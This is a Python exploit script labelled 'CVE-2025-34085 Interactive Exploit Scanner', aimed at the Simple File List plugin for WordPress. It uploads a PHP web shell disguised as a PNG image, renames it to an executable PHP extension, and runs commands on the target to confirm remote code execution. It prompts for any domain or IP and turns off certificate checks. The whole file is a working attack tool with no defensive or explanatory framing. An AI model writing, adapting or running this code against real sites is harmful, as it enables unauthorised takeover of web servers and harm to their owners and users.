import requests
import hashlib
import time
import random
import string
import uuid
from colorama import Fore, Style, init

init(autoreset=True)

COMMAND = "id"
EXPECTED_SUBSTRING = "uid="
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "*/*"
}
UPLOAD_PATH = "/wp-content/plugins/simple-file-list/ee-upload-engine.php"
RENAME_PATH = "/wp-content/plugins/simple-file-list/ee-file-engine.php"
SHELL_PATH = "/wp-content/uploads/simple-file-list/"

def normalize_url(domain, port):
    if not domain.startswith("http://") and not domain.startswith("https://"):
        return f"http://{domain}:{port}"
    return f"{domain}:{port}".rstrip('/')

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def generate_payload():
    return f"system($_GET['cmd']);"

def send_exploit(url):
    filename = rand_str()
    timestamp = str(int(time.time()))
    token = hashlib.md5(f'unique_salt{timestamp}'.encode()).hexdigest()
    php_payload = f"<?php {generate_payload()} ?>".encode()

    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
    multipart_body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"eeSFL_ID\"\r\n\r\n1\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"eeSFL_FileUploadDir\"\r\n\r\n{SHELL_PATH}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"eeSFL_Timestamp\"\r\n\r\n{timestamp}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"eeSFL_Token\"\r\n\r\n{token}\r\n"
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}.png\"\r\n"
        f"Content-Type: image/png\r\n\r\n"
    ).encode() + php_payload + f"\r\n--{boundary}--\r\n".encode()

    upload_headers = HEADERS.copy()
    upload_headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    upload_headers["Referer"] = f"{url}/wp-admin"
    upload_headers["Origin"] = url

    try:
        r = requests.post(url + UPLOAD_PATH, data=multipart_body, headers=upload_headers, timeout=10, verify=False)
        if r.status_code == 200 and "SUCCESS" in r.text:
            extensions = ['php', 'phtml', 'php5', 'php3']
            for ext in extensions:
                new_name = f"{filename}.{ext}"
                data = {
                    'eeSFL_ID': '1',
                    'eeListFolder': '/',
                    'eeFileOld': f"{filename}.png",
                    'eeFileAction': f"Rename|{new_name}"
                }
                r2 = requests.post(url + RENAME_PATH, data=data, headers=HEADERS, timeout=10, verify=False)
                if r2.status_code == 200:
                    shell_url = f"{url}{SHELL_PATH}{new_name}"
                    r3 = requests.get(shell_url, params={"cmd": COMMAND}, headers=HEADERS, timeout=10, verify=False)
                    if r3.status_code == 200 and EXPECTED_SUBSTRING in r3.text:
                        print(f"{Fore.GREEN}[+] Exploited: {url} | {shell_url} | {r3.text.strip()}")
                        return
        print(f"{Fore.RED}[-] Not Vulnerable or Unexpected Response: {url}")
    except Exception as e:
        print(f"{Fore.YELLOW}[x] Failed: {url} | {e}")

def main():
    print(Fore.CYAN + "\nCVE-2025-34085 Interactive Exploit Scanner")
    print(Fore.MAGENTA + "CTRL+C or type 'q' anytime to quit\n")
    requests.packages.urllib3.disable_warnings()

    while True:
        target = input(Fore.WHITE + "Enter target IP or domain (or q to quit): ").strip()
        if target.lower() == 'q':
            break
        port = input(Fore.WHITE + "Enter port (default 80): ").strip()
        if port.lower() == 'q':
            break
        if not port:
            port = "80"

        full_url = normalize_url(target, port)
        print(Fore.BLUE + f"\n[•] Targeting: {full_url}\n")
        send_exploit(full_url)
        print()

if __name__ == "__main__":
    main()
